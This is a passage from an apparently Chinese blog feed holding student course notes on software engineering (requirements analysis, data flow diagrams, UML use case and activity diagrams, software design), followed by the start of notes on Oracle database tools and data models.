title="定义"></a>定义</h3><p>确定系统必须具有的功能和性能，系统要求的运行环境，并且预测系统发展的前景。</p><p>换句话说需求就是以一种清晰、简洁、一致且无二义性的方式，对一个待开发系统中各个有意义方面的陈述的一个集合。</p><h3 id="过程-2"><a href="#过程-2" class="headerlink" title="过程"></a>过程</h3><ul><li><p>需求确认</p><ul><li><p>需求获取</p></li><li><p>需求提炼</p></li><li><p>需求描述</p></li><li><p>需求验证</p></li></ul></li><li><p>需求变更</p></li></ul><h2 id="需求确认"><a href="#需求确认" class="headerlink" title="需求确认"></a>需求确认</h2><h3 id="需求获取"><a href="#需求获取" class="headerlink" title="需求获取"></a>需求获取</h3><h4 id="定义-2"><a href="#定义-2" class="headerlink" title="定义"></a>定义</h4><p>软件需求获取指的是</p><ul><li>软件需求的来源</li><li>软件工程师收集这些软件需求的方法</li></ul><p>它也被称为需求抓取、需求发现和需求获得</p><h4 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h4><p>&#x3D;&#x3D;功能性需求&#x3D;&#x3D;</p><p>描述系统应该做什么，即为用户和其他系统完成的功能、提供的服务</p><p>&#x3D;&#x3D;非功能需求&#x3D;&#x3D;</p><p>必须遵循的标准，外部界面的细节，实现的约束条件，质量属性等等</p><h3 id="需求提炼-需求分析"><a href="#需求提炼-需求分析" class="headerlink" title="需求提炼(需求分析)"></a>需求提炼(需求分析)</h3><h4 id="定义-3"><a href="#定义-3" class="headerlink" title="定义"></a>定义</h4><p>对应用问题及环境的理解和分析，为问题涉及的信息、功能及系统行为建立模型。将用户需求精确化、完全化，最终形成下一步的需求规格说明书。</p><ul><li>需求提炼(需求分析)的核心在于<strong>建立分析模型</strong></li><li>需求提炼(需求分析)采用多种形式描述需求，通过建立需求的多种视图，揭示出一些更深的问题。</li><li>需求提炼(需求分析)还包括与客户的交流以澄清某些易混淆的问题，并明确哪些需求更为重要，其目的是确保所有风险承担着尽早地对项目达成共识并对将来的产品有个相同而清晰的认识。</li></ul><h4 id="需求分析模型"><a href="#需求分析模型" class="headerlink" title="需求分析模型"></a>需求分析模型</h4><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240104152441376.png" alt="image-20240104152441376" style="zoom: 33%;" /><h3 id="需求规格说明书-需求描述"><a href="#需求规格说明书-需求描述" class="headerlink" title="需求规格说明书(需求描述)"></a>需求规格说明书(需求描述)</h3><h4 id="定义-4"><a href="#定义-4" class="headerlink" title="定义"></a>定义</h4><p>软件需求规格说明书(SRS)——软件系统的需求规格说明，是对待开发系统的行为的完整描述。它包含了功能性需求和非功能性需求。</p><ul><li>需求分析工作完成的一个基本标志是形成了一份完整的、规范的需求规格说明书</li><li>需求规格说明书的编制是为了使用户和软件开发者双方对该软件的初始规定有一个共同的理解，使之成为整个开发工作的基础。</li></ul><h3 id="需求验证"><a href="#需求验证" class="headerlink" title="需求验证"></a>需求验证</h3><h4 id="重要性"><a href="#重要性" class="headerlink" title="重要性"></a>重要性</h4><p>如果在后续的开发或当系统投入使用时才发现需求文档中的错误，就会导致更大代价的返工。由需求问题而对系统做变更的成本比修改设计或代码错误的成本要大得多。假设需求阶段引入1个错误的需求，设计时对这个需求需要5-10条设计实现，1条设计需要5-10条程序，1条程序需要3-5种测试组合测试。</p><h4 id="需求验证的工作"><a href="#需求验证的工作" class="headerlink" title="需求验证的工作"></a>需求验证的工作</h4><p>对需求文档需执行以下类型的检查：</p><ul><li>&#x3D;&#x3D;有效性检查&#x3D;&#x3D;：检查不同用户使用不同功能的有效性</li><li>&#x3D;&#x3D;一致性检查&#x3D;&#x3D;：在文档中，需求之间不应该冲突</li><li>&#x3D;&#x3D;完备性检查&#x3D;&#x3D;：需求文档应该包括所有用户想要的功能和约束</li><li>&#x3D;&#x3D;现实性检查&#x3D;&#x3D;：检查保证能利用现有技术实现需求</li></ul><h4 id="需求验证技术"><a href="#需求验证技术" class="headerlink" title="需求验证技术"></a>需求验证技术</h4><ul><li>需求评审</li><li>利用原型检验系统是否符合用户的真正需要</li><li>对每个需求编写概念性的测试用例</li><li>编写用户手册。用浅显易懂的语言描述用户可见的功能</li><li>自动的一致性分析。可用CASE工具检验需求模型的一致性</li></ul><h2 id="需求变更"><a href="#需求变更" class="headerlink" title="需求变更"></a>需求变更</h2><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240104153638340.png" alt="image-20240104153638340" style="zoom:50%;" /><h2 id="需求分析任务"><a href="#需求分析任务" class="headerlink" title="需求分析任务"></a>需求分析任务</h2><ul><li>&#x3D;&#x3D;建立分析模型&#x3D;&#x3D;：准确地定义未来系统的目标，确定为了满足用户的需求系统必须做什么</li><li>&#x3D;&#x3D;编写需求说明&#x3D;&#x3D;：用《需求规格说明书》规范的形式准确地表达用户的需求</li></ul><h3 id="软件需求规格文档"><a href="#软件需求规格文档" class="headerlink" title="软件需求规格文档"></a>软件需求规格文档</h3><h4 id="原则"><a href="#原则" class="headerlink" title="原则"></a>原则</h4><ul><li>从现实中分离功能，即描述要“做什么”而不是“怎样实现”</li><li>要求使用<strong>面向处理的规</strong>格说明语言（或称系统定义语言）</li><li>如果被开发软件只是一个大系统中的一个元素，那么整个大系统也包括在规格说明的描述之中</li><li>规格说明必须包括<strong>系统运行环境</strong></li><li>规格说明必须是一个认识模型</li><li>规格说明必须是<strong>可操作的</strong></li><li>规格说明必须<strong>容许不完备性并允许扩充</strong></li><li>规格说明必须<strong>局部化和松散耦合</strong></li></ul><h4 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h4><ul><li>引言</li><li>综合描述</li><li>需求描述</li><li>附录(词汇表、分析模型、特定问题列表)</li><li>索引</li></ul><h3 id="需求分析模型概述"><a href="#需求分析模型概述" class="headerlink" title="需求分析模型概述"></a>需求分析模型概述</h3><p>&#x3D;&#x3D;面向过程分析模型&#x3D;&#x3D;</p><p>基本思想是用系统工程的思想和工程化的方法，根据用户至上的原则，自始至终按照”<strong>结构化、模块化、自顶向下</strong>“地对系统进行分析与设计</p><p>&#x3D;&#x3D;面向对象分析模型&#x3D;&#x3D;</p><p>由<strong>五个层次</strong></p><ul><li>主题层</li><li>对象类层</li><li>结构层</li><li>属性层</li><li>服务层</li></ul><p>和<strong>五个活动</strong></p><ul><li>标识对象类</li><li>标识结构</li><li>定义主题</li><li>定义属性</li><li>定义服务</li></ul><h4 id="分析模型描述工具"><a href="#分析模型描述工具" class="headerlink" title="分析模型描述工具"></a>分析模型描述工具</h4><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240104155857355.png" alt="image-20240104155857355" style="zoom:50%;" /><h2 id="面向过程的分析方法"><a href="#面向过程的分析方法" class="headerlink" title="面向过程的分析方法"></a>面向过程的分析方法</h2><h3 id="分析建模工具"><a href="#分析建模工具" class="headerlink" title="分析建模工具"></a>分析建模工具</h3><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240104160001320.png" alt="image-20240104160001320" style="zoom:50%;" /><h3 id="分析方法"><a href="#分析方法" class="headerlink" title="分析方法"></a>分析方法</h3><ul><li>面向数据流进行需求分析的方法</li><li>结构化分析方法适合于<strong>数据处理类型软件</strong>的需求分析</li><li>具体来说，结构化分析方法就是用<strong>抽象模型的</strong>概念，按照软件内部数据传递，变换的关系，<strong>自顶向下</strong>逐层分解，直到找到满足功能要求的所有可实现软件为止</li></ul><h3 id="数据模型-实体关系图"><a href="#数据模型-实体关系图" class="headerlink" title="数据模型-实体关系图"></a>数据模型-实体关系图</h3><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240104185604515.png" alt="image-20240104185604515" style="zoom: 50%;" /><h3 id="行为模型-状态转换图"><a href="#行为模型-状态转换图" class="headerlink" title="行为模型-状态转换图"></a>行为模型-状态转换图</h3><p>**状态转换图(状态图)**通过描绘系统的状态及引起系统状态转换的事件，来表示系统的行为。</p><h4 id="状态"><a href="#状态" class="headerlink" title="状态"></a>状态</h4><p>一个状态代表系统的一种行为模式。</p><p>在状态图中定义的状态主要有：初态，终态和中间状态。一张状态图里面只有一个初态，可以有0至多个终态。</p><h4 id="事件"><a href="#事件" class="headerlink" title="事件"></a>事件</h4><p>事件是在某个特定时刻发生的事情，它是对引起系统做动作或（和）从一个状态转换到另一个状态的外界事件的抽象。例如，内部时钟表明某个规定的时间段已经过去，用户移动鼠标、点击鼠标等都是事件。</p><p>简而言之，事件就是<strong>引起系统做动作或（和）转换状态的控制信息</strong>。</p><h4 id="符号"><a href="#符号" class="headerlink" title="符号"></a>符号</h4><p>在状态图中，初态用<strong>实心圆</strong>表示，终态用一对<strong>同心圆</strong>（内圆为实心圆）表示。中间状态用圆角矩形表示，可以用两条水平横线把它分成上、中、下3个部分。上面部分为<strong>状态的名称</strong>，这部分是必须有的；中间部分为状态变量的名字和值，这部分是可选的；下面部分是<strong>活动表</strong>，这部分也是可选的。</p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240104190449273.png" alt="image-20240104190449273" style="zoom:50%;" /><h3 id="结构化分析过程"><a href="#结构化分析过程" class="headerlink" title="结构化分析过程"></a>结构化分析过程</h3><p>&#x3D;&#x3D;①建立系统的功能模型&#x3D;&#x3D;</p><p>使用的工具为<strong>数据流图DFD</strong></p><ul><li>简历系统环境图(顶层数据流图)确定系统边界</li><li>自顶向下，逐步求精，建立系统的层次数据流图</li></ul><p>&#x3D;&#x3D;②建立数据字典&#x3D;&#x3D;</p><p>使用的工具为结构符：<strong>“+、|、{ }“</strong>等</p><p>定义数据流</p><p>定义数据存储</p><p>定义数据项</p><p>&#x3D;&#x3D;③给出加工小说明&#x3D;&#x3D;</p><p>使用的工具可以是<strong>结构化自然语言、判定表、判定树</strong></p><p>集中描述一个加工“做什么”，即加工逻辑，也保罗其他一些与加工有关的信息，如执行条件、优先级、执行频率、出错处理等</p><h3 id="功能模型-数据流图"><a href="#功能模型-数据流图" class="headerlink" title="功能模型-数据流图"></a>功能模型-数据流图</h3><h4 id="数据流图中的主要图形元素"><a href="#数据流图中的主要图形元素" class="headerlink" title="数据流图中的主要图形元素"></a>数据流图中的主要图形元素</h4><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240104191053076.png" alt="image-20240104191053076" style="zoom:50%;" /><h4 id="数据流图实例"><a href="#数据流图实例" class="headerlink" title="数据流图实例"></a>数据流图实例</h4><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240104191125161.png" alt="image-20240104191125161" style="zoom:50%;" /><h4 id="数据流图层次结构"><a href="#数据流图层次结构" class="headerlink" title="数据流图层次结构"></a>数据流图层次结构</h4><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240104191406586.png" alt="image-20240104191406586" style="zoom:50%;" /><h4 id="加工"><a href="#加工" class="headerlink" title="加工"></a>加工</h4><ul><li>表示对数据进行的操作，如“处理选课单”，“产生发票”等</li><li>加工的编号，说明这个加工在层次分解中的位置</li></ul><h4 id="外部实体（数据源点-终点）"><a href="#外部实体（数据源点-终点）" class="headerlink" title="外部实体（数据源点&#x2F;终点）"></a>外部实体（数据源点&#x2F;终点）</h4><ul><li>位于系统之外的信息提供者或使用者,称为外部实体。即存在于系统之外的人员或组织。如“学务科”等</li><li>说明数据输入的源点(数据源)或数据输出的终点(数据终点)</li><li>起到更好的理解作用，但不是系统中的事物</li></ul><h4 id="数据流"><a href="#数据流" class="headerlink" title="数据流"></a>数据流</h4><ul><li>表示数据和数据流向, 由一组固定成分的数据组成。如“选课单”由“学号、姓名、课程编号、课程名”等成分组成</li><li>数据流可从加工流向加工，也可在加工与数据存储或外部项之间流动；两个加工之间可有多股数据流</li></ul><h4 id="数据流与数据加工之间关系"><a href="#数据流与数据加工之间关系" class="headerlink" title="数据流与数据加工之间关系"></a>数据流与数据加工之间关系</h4><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240104191844822.png" alt="image-20240104191844822" style="zoom:50%;" /><h4 id="画分层数据流图的步骤"><a href="#画分层数据流图的步骤" class="headerlink" title="画分层数据流图的步骤"></a>画分层数据流图的步骤</h4><p><strong>第一步：画系统的输入和输出（画出顶层图）</strong></p><p><strong>第二步：画系统内部</strong></p><p><strong>第三步：画加工内部</strong></p><p><strong>第四步：重复第3步，直至每个尚未分解的加工都足够简单(即不必再分解)</strong></p><h2 id="面向对象的分析方法"><a href="#面向对象的分析方法" class="headerlink" title="面向对象的分析方法"></a>面向对象的分析方法</h2><p>​——一特定的软件开发方法学</p><p>面向对象方法是一种以对象、对象关系等来构造软件系统模型的系统化方法。</p><p>面向对象方法的世界观：一切系统都是由对象构成。</p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240104192216887.png" alt="image-20240104192216887" style="zoom:50%;" /><ul><li>面向对象的分析(OOA)</li><li>面向对象的设计(OOD)</li><li>面向对象的程序设计(OOP)</li></ul><h4 id="著名面向对象方法"><a href="#著名面向对象方法" class="headerlink" title="著名面向对象方法"></a>著名面向对象方法</h4><ul><li>Booch 方法（ 1991 )</li><li>Coad 一 Yourdon 方法（ 1991 )</li><li>Rumbaugh 方法（简称 OMT ) ( object Modeling Technology 1991 )</li><li>Jacobson 方法（简称 OOSE , 1992 )</li><li>由 Rumbaugh 、 Booch 、 Jacobson 提出的<strong>统一建模语言 ( 简称UML )</strong> ( Unify Modeling Language ，1994 )</li></ul><h3 id="UML"><a href="#UML" class="headerlink" title="UML"></a>UML</h3><h4 id="特点-2"><a href="#特点-2" class="headerlink" title="特点"></a>特点</h4><ul><li>统一标准：已成为面向对象的标准化的统一的建模语言</li><li>面向对象</li><li>可视化，表示能力强大</li><li>独立于过程</li><li>概念明确，建模表示简洁，容易掌握使用</li></ul><h4 id="支持-1"><a href="#支持-1" class="headerlink" title="支持"></a>支持</h4><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240104192723959.png" alt="image-20240104192723959" style="zoom:50%;" /><h4 id="软件开发模型"><a href="#软件开发模型" class="headerlink" title="软件开发模型"></a>软件开发模型</h4><p>&#x3D;&#x3D;数据模型(对象模型)&#x3D;&#x3D;</p><p>描述系统数据结构的对象模型；</p><p>&#x3D;&#x3D;行为模型(动态模型)&#x3D;&#x3D;</p><p>描述系统控制结构</p><p>&#x3D;&#x3D;功能模型&#x3D;&#x3D;</p><p>描述系统功能</p><blockquote><p>一个典型的软件系统使用数据结构（数据模型），执行操作（行为模型），并且完成数据值的变化（功能模型）</p></blockquote><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240104193115544.png" alt="image-20240104193115544" style="zoom: 33%;" /><h3 id="功能模型——用例图"><a href="#功能模型——用例图" class="headerlink" title="功能模型——用例图"></a>功能模型——用例图</h3><h4 id="基本图形符号"><a href="#基本图形符号" class="headerlink" title="基本图形符号"></a>基本图形符号</h4><p>用例建模用于描述系统需求，把系统当作黑盒，从用户的角度，描述系统的场景。主要图形元素有以下几个</p><ul><li>&#x3D;&#x3D;参与者&#x3D;&#x3D;：是指外部用户或外部实体在系统中扮演的角色。可以是一个人、一个计算机子系统、硬件设备或者时间等角色</li><li>&#x3D;&#x3D;用例&#x3D;&#x3D;：对一组动作序列的描述，系统通过执行这一组动作序列为参与者产生一个可观察的结果。用例名往往用动宾结构命名。</li><li>&#x3D;&#x3D;执行关联&#x3D;&#x3D;：参与者（Actor ）执行用例（Use Case）之间的关系</li></ul><h4 id="参与者-Actor"><a href="#参与者-Actor" class="headerlink" title="参与者(Actor)"></a>参与者(Actor)</h4><ul><li>参与者(actor)指系统以外的、需要使用系统或与系统交互的东西，包括人、设备、外部系统等</li></ul><p>表示形式：</p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240104195101811.png" alt="image-20240104195101811" style="zoom:33%;" /><h5 id="确定参与者"><a href="#确定参与者" class="headerlink" title="确定参与者"></a>确定参与者</h5><p>如饮料自动售货系统：参与者有<strong>顾客，供应商和收银员</strong></p><h4 id="用例-Use-Case"><a href="#用例-Use-Case" class="headerlink" title="用例(Use Case)"></a>用例(Use Case)</h4><ul><li>对一组动作序列的描述，系统通过执行这一组动作序列为参与者产生一个可观察的结果</li><li>用椭圆形表示</li></ul><p>&#x3D;&#x3D;特征&#x3D;&#x3D;</p><ul><li>说明了系统具有的一种行为模式</li><li>说明了一个参与者与系统执行的一个相关的事件序列</li><li>提供了一种获取系统需求的方法</li><li>提供了一种与最终的<strong>用户</strong>和<strong>领域专家</strong>进行沟通的方法</li><li>提供了一种<strong>测试系统</strong>的方法</li></ul><h5 id="获取用例"><a href="#获取用例" class="headerlink" title="获取用例"></a>获取用例</h5><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240104200939653.png" alt="image-20240104200939653" style="zoom:33%;" /><h4 id="系统和关联"><a href="#系统和关联" class="headerlink" title="系统和关联"></a>系统和关联</h4><p>&#x3D;&#x3D;系统&#x3D;&#x3D;：用于界定系统功能范围，描述该功能的用例都置于其中，而描述外部实体的参与者都置于其外</p><p>&#x3D;&#x3D;关联&#x3D;&#x3D;：连接参与者与用例，表示参与者所代表的系统外部实体与该用例所描述的系统需求有关</p><h4 id="初步实现"><a href="#初步实现" class="headerlink" title="初步实现"></a>初步实现</h4><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240104201243414.png" alt="image-20240104201243414" style="zoom:50%;" /><p>建立用例模型的顺序是：</p><ul><li>确定谁会直接使用该系统。这些都是<strong>参与者</strong>(Actor)。选取其中一个参与者。</li><li>定义该参与者希望系统做什么，参与者希望系统做的每件事成为一个<strong>用例</strong>。</li><li>对每件事来说，何时参与者会使用系统，通常会发生什么，这就是<strong>用例的基本过程</strong>。描述该用例的基本过程。</li></ul><h4 id="用例扩展"><a href="#用例扩展" class="headerlink" title="用例扩展"></a>用例扩展</h4><ul><li>考虑一些可变情况，把他们创建为扩展用例</li><li>复审不同用例的描述，找出其中的相同点，抽出相同点作为共同的用例</li></ul><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240104225702045.png" alt="image-20240104225702045" style="zoom:50%;" /><h4 id="用例之间的关系"><a href="#用例之间的关系" class="headerlink" title="用例之间的关系"></a>用例之间的关系</h4><p>&#x3D;&#x3D;泛化&#x3D;&#x3D;(Inheritance)</p><p>就是通常理解的继承关系，子用例和父用例相似，但表现出更特别的行为；子用例将继承父用例的所有结构、行为和关系。子用例可以使用父用例的一段行为，也可以重载它。父用例通常是抽象的。</p><p>(子用例-&gt;父用例)</p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240104230219431.png" alt="image-20240104230219431" style="zoom: 33%;" /><p>&#x3D;&#x3D;包含&#x3D;&#x3D;(Include)</p><p>包含关系用来把一个较复杂用例所表示的功能分解成较小的步骤。一个用例可以包含另外一个用例</p><p>(复杂功能用例-&gt;分解出来的功能用例)</p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240104230325412.png" alt="image-20240104230325412" style="zoom: 33%;" /><p>&#x3D;&#x3D;关联&#x3D;&#x3D;(Association)</p><p>表示参与者与用例之间的通信，任何一方都可以发送或者接收消息。</p><p>(发送方-&gt;接收方)</p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240104230009061.png" alt="image-20240104230009061" style="zoom:33%;" /><p>注：参与者可以参与多个用例，由此形成子系统</p><p>&#x3D;&#x3D;扩展&#x3D;&#x3D;(Extend)</p><p>扩展关系是指用例功能的延伸，相当于为基础用例提供一个附加功能。由一个用例的扩展点可以扩展出另外一个用例。</p><p>(扩展用例-&gt;基础用例)</p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240104230402101.png" alt="image-20240104230402101" style="zoom:33%;" /><h4 id="扩展和包含"><a href="#扩展和包含" class="headerlink" title="扩展和包含"></a>扩展和包含</h4><ul><li>在<strong>扩展关系</strong>中，一个基本用例执行时，可以执行、也可以不执行扩展用例部分</li><li>在<strong>包含关系</strong>中，在执行基本用例时，一定会执行包含用例部分</li></ul><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240104230824308.png" alt="image-20240104230824308" style="zoom:50%;" /><h4 id="成绩管理系统用例图"><a href="#成绩管理系统用例图" class="headerlink" title="成绩管理系统用例图"></a>成绩管理系统用例图</h4><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240104230924962.png" alt="image-20240104230924962" style="zoom: 50%;" /><h3 id="行为模型——活动图"><a href="#行为模型——活动图" class="headerlink" title="行为模型——活动图"></a>行为模型——活动图</h3><h4 id="活动模型"><a href="#活动模型" class="headerlink" title="活动模型"></a>活动模型</h4><ul><li>能够图形化显示用例的事件流</li><li>也能用于<ul><li>在用例创建之前，在高层抽象上理解业务过程</li><li>在更低层抽象上，设计复杂的顺序算法或设计多线程应用中的并发</li></ul></li></ul><h4 id="展示计算的步骤"><a href="#展示计算的步骤" class="headerlink" title="展示计算的步骤"></a>展示计算的步骤</h4><ul><li>每一步都是做某事的一个状态</li><li>执行步骤称为动作</li><li>描述哪些步骤被顺序执行、哪些可被并发地执行</li><li>控制流-控制从一个动作到下一个动作的流</li></ul><h4 id="开始与结束"><a href="#开始与结束" class="headerlink" title="开始与结束"></a>开始与结束</h4><p>&#x3D;&#x3D;开始&#x3D;&#x3D;</p><p>实心圆</p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240104234328851.png" alt="image-20240104234328851" style="zoom:33%;" /><p>&#x3D;&#x3D;结束&#x3D;&#x3D;</p><p>用“牛眼（bull’s eye）”符号表示</p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240104234359728.png" alt="image-20240104234359728" style="zoom:25%;" /><h4 id="控制结点"><a href="#控制结点" class="headerlink" title="控制结点"></a>控制结点</h4><ul><li>控制节点是一种特殊的活动节点，用于在动作节点或对象之间协调流，包括分支与合并、分叉与汇合等。</li><li>分支及合并（钻石框） – 可选计算线程</li></ul><h4 id="分支与合并"><a href="#分支与合并" class="headerlink" title="分支与合并"></a>分支与合并</h4><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240104234607453.png" alt="image-20240104234607453" style="zoom:50%;" /><h4 id="分叉及汇合"><a href="#分叉及汇合" class="headerlink" title="分叉及汇合"></a>分叉及汇合</h4><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240104235837810.png" alt="image-20240104235837810" style="zoom:50%;" /><h4 id="泳道划分活动图"><a href="#泳道划分活动图" class="headerlink" title="泳道划分活动图"></a>泳道划分活动图</h4><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240104235252099.png" alt="image-20240104235252099" style="zoom:50%;" /><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240104235328404.png" alt="image-20240104235328404" style="zoom:50%;" /><h1 id="软件设计"><a href="#软件设计" class="headerlink" title="软件设计"></a>软件设计</h1><h2 id="软件设计概述"><a href="#软件设计概述" class="headerlink" title="软件设计概述"></a>软件设计概述</h2><h3 id="软件设计的概念"><a href="#软件设计的概念" class="headerlink" title="软件设计的概念"></a>软件设计的概念</h3><p>&#x3D;&#x3D;定义&#x3D;&#x3D;</p><p>软件设计定义为软件系统或组件的<strong>架构、构件、接口和其他特性</strong>的定义过程及该过程的结果。</p><p>软件设计是：</p><ul><li>软件生命周期中的一个活动</li><li>进行软件编码的基础</li><li>软件需求分析被转化为软件的内部结构</li><li>是连接用户需求和软件技术的桥梁</li></ul><h4 id="软件工程中的设计"><a href="#软件工程中的设计" class="headerlink" title="软件工程中的设计"></a>软件工程中的设计</h4><ul><li>模型输入<ul><li>软件需求的<strong>数据模型、功能模型和行为模型</strong></li></ul></li><li>分类<ul><li>数据设计</li><li>架构设计</li><li>接口设计</li><li>组件设计</li></ul></li></ul><h4 id="设计相关概念"><a href="#设计相关概念" class="headerlink" title="设计相关概念"></a>设计相关概念</h4><ul><li>抽象：是“<strong>忽略具体的信息将不同事物看成相同事物的过程</strong>“</li><li>体系结构：软件的整体结构和这种结构为系统提供概念上完整性的方式</li><li>设计模式：在给定上下文环境中一类共同问题的共同解决方案</li><li>模块化：软件被划分为命名和功能相对独立的多个组件（通常称为模块），通过这些组件的集成来满足问题的需求</li><li>信息隐藏：模块定义和设计时应当保证模块内的信息（过程和数据）不可以被不需要这些信息的其他模块访问</li><li>功能独立：每个模块只负责需求中特定的子功能，并且从程序结构的其他部分看，该模块具有简单的接口</li><li>精化：逐步求精的过程</li><li>重构：不改变组件功能和行为条件下，简化组件设计（或代码）的一种重组技术</li></ul><h2 id="面向对象设计"><a href="#面向对象设计" class="headerlink" title="面向对象设计"></a>面向对象设计</h2><h3 id="架构设计"><a href="#架构设计" class="headerlink" title="架构设计"></a>架构设计</h3><p>架构设计的目的是要勾画出系统出总体结构，这项工作由经验丰富的架构设计师主持完成。</p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240110211359428.png" alt="image-20240110211359428" style="zoom: 33%;" /><h4 id="构造系统的物理模型"><a href="#构造系统的物理模型" class="headerlink" title="构造系统的物理模型"></a>构造系统的物理模型</h4><ul><li>首先用UML的配置图(部署图)描述系统的物理结构</li><li>将需求分析阶段捕获的系统功能分配到这些物理结点上</li><li>配置图上可以显示计算节点的拓扑结构、硬件设备匹配、通信路径、各个节点上运行的系统软件配置、应用软件配置</li></ul><p>例图：<img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240110211638400.png" alt="image-20240110211638400" style="zoom: 67%;" /></p><h4 id="设计子系统"><a href="#设计子系统" class="headerlink" title="设计子系统"></a>设计子系统</h4><ul><li>对于一个复杂的软件系统来说，将其分解成若干个子系统，子系统内还可以继续划分系统或包，这种自顶向下、逐步细化的组织结构非常符合人类分析问题的思路</li><li>每个子系统与其他子系统之间应该定义接口，在接口上说明交互信息，注意这时还不要描述子系统的内部实现</li><li>可用UNL组件图表示</li></ul><p>例图：<img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240110211959943.png" alt="image-20240110211959943" style="zoom: 50%;" /></p><h4 id="非功能需求设计"><a href="#非功能需求设计" class="headerlink" title="非功能需求设计"></a>非功能需求设计</h4><ul><li>分析阶段定义了整个系统的非功能需求，在水果盒几阶段要研究这些需求，设计出可行的方案</li><li>非功能需求包括：<ul><li>系统的安全性</li><li>错误检测和故障恢复</li><li>可移植性和通用性等</li></ul></li></ul><h3 id="用例设计与类设计"><a href="#用例设计与类设计" class="headerlink" title="用例设计与类设计"></a>用例设计与类设计</h3><ul><li>根据分析阶段产生的高层类图和交互图，由用例设计师研究已有的类，将它们分配到相应的用例中</li><li>检查每个用例功能，依靠当前的类能否实现，同时检查每个用例的特殊需求是否有合适的类来实现</li><li>细化每个用例的类图，描述实现用例的类及其类之间的相互关系，其中的通用列和关键类可用粗线框区分，这些类将作为项目经历检查项目时的重点</li></ul>]]></content>
      
      
      <categories>
          
          <category> 课内 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 课内 </tag>
            
            <tag> 软件工程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>oracle</title>
      <link href="/2024/01/01/oracle/"/>
      <url>/2024/01/01/oracle/</url>
      
        <content type="html"><![CDATA[<h2 id="数据库系统概述"><a href="#数据库系统概述" class="headerlink" title="数据库系统概述"></a>数据库系统概述</h2><h3 id="数据库工具"><a href="#数据库工具" class="headerlink" title="数据库工具"></a>数据库工具</h3><blockquote><p>Oracle Enterprise Manager Database Express工具</p></blockquote><ul><li>企业管理器数据库快捷版，为DBA用户提供基本的数据库系统管理功能</li><li>在浏览器中访问<code>https://localhost:5500/em/login</code>进入数据库管理登录页面</li><li>提供安全管理(表空间、还原管理、归档日志、控制文件)、配置管理(初始化参数、内存、当前数据库属性)和性能监控(主机负载、主机内存、主机I&#x2F;O)</li></ul><blockquote><p>Oracle SQL Developer工具</p></blockquote><ul><li>支持DBA进行数据库管理功能操作</li><li>也能支持DBA进行数据库开发对象操作(创建数据库表、索引、视图、触发器和存储过程等对象)</li></ul><blockquote><p>Database Configuration Assistant工具</p></blockquote><ul><li>数据库配置助手，DBCA。</li><li>可以新建或删除一个数据库，也可以对以有的数据库配置进行修改</li></ul><blockquote><p>SQL Plus工具</p></blockquote><ul><li>基于命令行的数据库操作工具</li><li>可以将SQL语言命令和PL&#x2F;SQL语言命令提交数据库管理系统执行，实现对数据库进行操作访问和数据库管理</li><li>可以实现对数据库服务启停控制、数据库创建、用户权限管理和数据表访问等操作</li></ul><h3 id="数据库系统结构"><a href="#数据库系统结构" class="headerlink" title="数据库系统结构"></a>数据库系统结构</h3><h4 id="关系数据模型"><a href="#关系数据模型" class="headerlink" title="关系数据模型"></a>关系数据模型</h4><p>关系数据模型是一种以关系表为数据结构、采用关系操作方式访问数据的数据模型。该数据模型由如下三种部分组成。</p><ul><li>关系表结构</li><li>关系操作   [选择，头型，连接··]</li><li>关系约束   [完整性约束，参照完整性约束，自定义完整性约束]</li></ul><p>关系数据库是一种依赖关系模型组织、存储和管理数据的数据库。在数据库中，不仅存放了数据，还存放了数据结构及其数据关系。</p><h4 id="多模数据库"><a href="#多模数据库" class="headerlink" title="多模数据库"></a>多模数据库</h4><ul><li>关系数据库——关系数据模型</li><li>json数据库——json数据模型</li><li>xml数据库——XML数据模型</li><li>文档数据库——文档数据模型</li><li>键值</li><li>图</li><li>空间</li><li>···</li></ul><p>后面的都是<strong>nosql</strong>数据库。</p><h4 